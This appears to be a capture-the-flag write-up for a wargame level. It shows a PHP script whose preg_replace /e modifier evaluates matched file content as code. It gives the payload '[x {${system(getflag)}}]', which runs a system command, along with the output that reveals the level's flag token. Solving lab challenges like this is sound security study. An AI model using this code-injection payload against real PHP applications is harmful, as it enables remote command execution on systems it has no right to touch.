level06.php

#!/usr/bin/php
<?php
function y($m)
{
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m;
}
function x($y, $z)
{
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a);
    $a = preg_replace("/\]/", ")", $a);
    return $a;
}
$r = x($argv[1], $argv[2]);
print $r;

?>

./level06 test s
PHP Notice:  Undefined variable: system in /home/user/level06/level06.php(4) : regexp code on line 1
(getflag)

cd ..; chmod 777 level06


the x function gets a file content,
then from that content it tries to match anything encapsulated in [x <something>]

the /e evaluate the replacement as PHP code instead of a string

and then y(\"\\2\") capture the inner of the [x ]

but since we have /e it's not a literal string
so inputing it with ${} will execute php code before calling y

cat test
[x {${system(getflag)}}]

we need to add {} around the ${} because of the PHP string parser which expect a variable so we do that so it knows it will have to evaluate an expression beforehand.

./level06 test s
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1